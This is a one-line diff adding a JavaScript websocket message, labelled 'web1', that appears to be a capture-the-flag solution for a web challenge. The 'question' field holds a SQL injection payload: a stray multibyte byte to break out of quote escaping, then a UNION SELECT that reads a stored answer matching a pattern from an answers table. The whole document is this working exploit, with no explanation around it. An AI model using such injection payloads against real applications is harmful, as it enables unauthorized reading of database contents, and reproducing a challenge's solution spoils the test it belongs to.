@@ -1,0 +1,1 @@
+web1: socket.send(JSON.stringify({"type": "get_answer", "question": "\xa5\" UNION SELECT 1,(SELECT answer FROM answers WHERE answer LIKE CONCAT(CHAR(37),CHAR(66),CHAR(75),CHAR(37)) LIMIT 1),1; -- ", "answer": ""}))
